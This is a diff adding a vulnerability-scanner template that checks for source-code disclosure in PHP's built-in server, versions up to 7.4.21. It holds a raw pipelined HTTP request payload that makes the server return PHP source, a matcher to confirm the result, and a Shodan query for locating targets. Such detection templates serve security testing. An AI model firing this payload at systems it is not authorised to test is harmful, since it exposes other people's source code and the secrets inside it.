@@ -1,0 +1,34 @@
+id: php-src-diclosure
+
+info:
+  name: PHP <= 7.4.21 - Built-in Server Remote Source Disclosure
+  author: pdteam
+  severity: medium
+  metadata:
+    verified: true
+    shodan-query: The requested resource <code class="url">
+  tags: php,phpcli,disclosure
+
+requests:
+  - raw:
+      - |+
+        GET /  HTTP/1.1
+        Host: {{Hostname}}
+        
+        GET /{{rand_base(3)}}.{{rand_base(2)}} HTTP/1.1
+   
+     
+
+        
+        
+      - |+
+        GET /  HTTP/1.1
+        Host: {{Hostname}}
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1, "<?php")' 
+          - '!contains(body_2, "<?php")'
+        condition: and
